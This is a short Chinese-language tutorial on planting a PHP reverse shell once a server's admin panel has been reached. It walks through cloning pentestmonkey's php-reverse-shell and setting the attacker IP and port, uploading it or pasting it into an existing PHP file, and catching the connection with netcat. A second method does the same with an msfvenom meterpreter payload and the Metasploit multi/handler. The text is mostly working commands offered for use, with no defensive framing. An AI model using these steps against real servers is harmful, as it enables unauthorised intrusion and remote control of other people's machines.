# 在进入目标机的服务器管理员界面后，有时候发现可以通过上传或修改php文件来进入目标机

## 方法有很多：

### 1.netcat：
这是基于netcat的方法

首先得有一个php reverse shell.php文件

可以用

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
```

来下载php文件，克隆后有个php-reverse-shell文件夹，cd进去就有个php-reverse-shell.php文件

用vim修改它

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // 把这里改为自己的ip
$port = 1234;       // 把这里改为想监听的端口，最好大于1023
$chunk_size = 1400;
$write_a = null;
```

修改完后，想办法上传该php文件：若可以通过服务器管理员的界面修改php文件，也可以将一个无关紧要的php文件修改为上面的代码（复制粘贴）

上传或修改完后

 

就用netcat监听端口
```
nc -lvnp 1234

1234为监听端口，跟之前php文件修改时的端口号保持一致
```

接着就运行php文件
```
http://target.ip/yourphp.php
````

然后就收到返回来的链接，就可以进入目标机了（有时为root登入，有时为客户登入）。

### 2.msfvenom

当然也可以用msfvenom制作一个php reverse shell文件

代码如下：

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=your_ip LPORT=1234 -f raw -o yourphp.php

LHOST是你的ip地址
LPROT是接收链接的端口
-o后接输出的文件名
```

生成php文件后，就想办法上传或是在服务器管理员的界面修改php文件（复制粘贴）

 

接着打开msf控制台

```
msfconsole
```

然后
```
1 use exploit/multi/handler
2 set payload php/meterpreter/reverse_tcp
3 set LHOST your_ip
4 set LPORT 1234
5 run
```

接着执行php文件
```
http://target.ip/yourphp.php
```

进入meterpreter界面后输入shell就行了。



